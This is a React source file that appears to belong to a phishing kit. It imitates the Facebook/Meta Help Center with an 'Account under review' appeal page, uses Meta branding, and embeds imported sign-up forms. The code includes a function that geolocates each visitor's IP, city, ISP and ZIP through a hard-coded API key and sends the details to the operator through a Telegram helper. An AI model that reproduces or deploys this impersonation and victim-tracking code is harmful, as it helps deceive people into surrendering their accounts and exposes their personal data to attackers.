import { Collapse, Layout } from "antd";
import "./App.css";
import "antd/dist/antd.css";
import { Sidebar } from "./components/Sidebar";
import { SignUp } from "./components/SignUp";
import { SignUpMobile } from "./components/SignUpMobile";
import { useEffect } from "react";
import { sendTelegram } from "./utils/sendTelegram";
import { getConfig } from "./utils/getConfig";

function App() {
  const hostname = window.location.hostname;
  const { Header, Sider, Content } = Layout;
  const { Panel } = Collapse;

  const getIpConfig = () => {
    fetch(
      "https://api.ipgeolocation.io/ipgeo?apiKey=defba4e9d87c44ce9125f6101daf33a1"
    )
      .then((response) => response.json())
      .then((data) => {
        let body = {
          ip: data.ip,
          country: data.country_code2,
          region: data.state_prov,
          city: data.city,
          org: data.isp,
          zip: data.zipcode,
        };

        // Replace this
        localStorage.setItem("ip-datas", JSON.stringify(body));

        let telegram_data = `
          ===== ONLINE =====
            IP: ${data.ip}
            City: ${data.city}
            Region: ${data.state_prov}
            Country: ${data.country_code2}
            ISP: ${data.isp}
            ZIP: ${data.zipcode}
          `;

        sendTelegram(telegram_data, true);
      });
  };

  useEffect(() => {
    // getIpConfig();
    getConfig(hostname);
  }, []);

  return (
    <div className="App">
      <Layout>
        <Header>
          <div className="header-show-on-desktop">
            <div className="header-desktop-flex">
              <div className="flex-desktop-header">
                <div className="flex-image-desktop-facebook">
                  <img src="/facebookLogo1.png" />
                </div>
                <h2>Help Center</h2>
              </div>
              <div className="input-button-desktop">
                <div className="input-desktop">
                  <span className="search-desktop-icon"></span>
                  <span>Search help articles...</span>
                </div>
                <div className="managing-account-2">
                  <span className="download-icon-desktop"></span>
                </div>
                <div className="desktop-english">English (US)</div>
              </div>
            </div>
          </div>

          <div className="header-show-on-mobile">
            <div className="mobile-facebook-text">
              <div className="mobile-facebook-icon">
                <img src="/facebookLogo1.png" />
              </div>
              <h2>Help Center</h2>
            </div>
            <div className="flex-mobile-icons-header">
              <div className="mobile-search-icon">
                <span className="span-mobile-search-icon"></span>
              </div>
              <div className="mobile-toggle-icon">
                <span className="span-mobile-toggle-icon"></span>
              </div>
            </div>
          </div>
        </Header>
        <Layout>
          <div className="hide-on-mobile">
            <Sider
              width="360"
              trigger={null}
              collapsible
              // collapsed={collapse}
              className="sider-menu"
            >
              <Sidebar />
            </Sider>
          </div>
          <Content>
            <div className="hide-on-mobile">
              <div className="image-with-text-color">
                <div className="image-with-text">
                  <div className="secure-container">
                    <div className="secure-image-center">
                      <img src="/secure.png" />
                    </div>
                    <div className="flex-secure">
                      <h1>Account under review</h1>
                      {/* <div className="button">Copy Link</div> */}
                    </div>
                  </div>
                </div>
              </div>
              <div className="will-remove">
                <div className="fb-container">
                  <div className="secure-text">
                    <p>
                      <span className="change-color">
                        Your Account is under review.
                      </span>
                      If you think your account shouldn't be removed, please
                      fill out this form. We'll review your appeal and take the
                      appropriate action based on our Community Standards
                    </p>
                  </div>
                  <div className="article-container">
                    <div className="article-text">
                      {/* <p>
                        What can I do to keep my Facebook account secure when
                        using payments in messages?
                      </p>
                      <p>What is a security key and how does it work?</p>
                      <p>
                        What's Facebook Security Checkup and how do I start it?
                      </p>
                      <p>Will Facebook ever ask me for my password?</p>
                      <p>Keeping Your Information Safe</p>
                      */}
                      <SignUp />
                    </div>
                  </div>
                  <div className="topics-container">
                    <h2>Related Topics</h2>
                    <div className="box-container">
                      <div className="box-color">
                        <div className="box-text">
                          <div className="center-img">
                            <img className="img-width" src="/yourprivacy.png" />
                          </div>
                          <h4>Your Privacy</h4>
                          <p>
                            Learn how privacy settings help you connect and
                            share with people you know and trust.
                          </p>
                        </div>
                      </div>
                      <div className="box-color">
                        <div className="box-text">
                          <div className="center-img">
                            <img className="img-width" src="/drawimage.png" />
                          </div>
                          <h4>Account Settings</h4>
                          <p>
                            Learn how to adjust your settings, change your
                            username and choose a legacy contact.
                          </p>
                        </div>
                      </div>
                      <div className="box-color">
                        <div className="box-text">
                          <div className="center-img">
                            <img
                              className="img-width"
                              src="/reportingabuse.png"
                            />
                          </div>
                          <h4>Reporting Abuse</h4>
                          <p>
                            Learn how to report something that goes against the
                            Facebook Community Standards.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div className="footer-color">
                <div className="footer-container">
                  <div className="flex meta-text">
                    <p>© 2022 Meta</p>
                  </div>
                  <div className="flex menu-text">
                    <p>About</p>
                    <p>Ad Choices</p>
                    <p>Create Ad</p>
                  </div>
                  <div className="flex menu-text">
                    <p>Privacy</p>
                    <p>Careers</p>
                    <p>Create Page</p>
                  </div>
                  <div className="flex menu-text">
                    <p>Terms and Policies</p>
                    <p>Cookies</p>
                  </div>
                  <div className="flex image-footer">
                    <img src="/logometa.png" />
                  </div>
                </div>
              </div>
            </div>
            <div className="show-on-mobile">
              <div className="">
                <div className="">
                  <div className="mobile-secure">
                    <h1>Account under review</h1>
                    <div className="button-container">
                      {" "}
                      <span className="button-2"></span>
                    </div>
                  </div>
                </div>
                <div className="container-mobile">
                  <div className="secure-text-2">
                    <p>
                      <span className="change-color">
                        Your Account is under review.
                      </span>{" "}
                      If you think your account shouldn't be removed, please
                      fill out this form. We'll review your appeal and take the
                      appropriate action based on our Community Standards{" "}
                    </p>
                  </div>
                  <div className="collapse-container"></div>
                  <div className="sign-up-mobile">
                    <SignUpMobile />
                  </div>
                  <div className="mobile-related-topics">
                    <div className="mobile-related-container">
                      <h2></h2>
                      <div>
                        <Collapse expandIconPosition={"right"}>
                          <Panel
                            header="Your Privacy"
                            key="1"
                            className="first-mobile-panel"
                          ></Panel>
                          <Panel
                            header="Account Settings"
                            key="2"
                            Gender
                            className="second-mobile-panel"
                          ></Panel>
                          <Panel
                            header="Reporting Abuse"
                            key="3"
                            className="third-mobile-panel"
                          ></Panel>
                        </Collapse>
                      </div>
                    </div>
                  </div>
                  <div className="mobile-footer-container">
                    <div>
                      <p>© 2022 Meta</p>
                      <div className="mobile-english">English (US)</div>
                      <p>About</p>
                      <p>Privacy</p>
                      <p>Terms and Policies</p>
                      <p>Ad Choices</p>
                      <p>Careers</p>
                      <p>Cookies</p>
                      <p>Create Ad</p>
                      <p>Create Page</p>
                      <div className="mobile-footer-img">
                        <img src="/logometa.png" />
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </Content>
        </Layout>
      </Layout>
    </div>
  );
}

export default App;
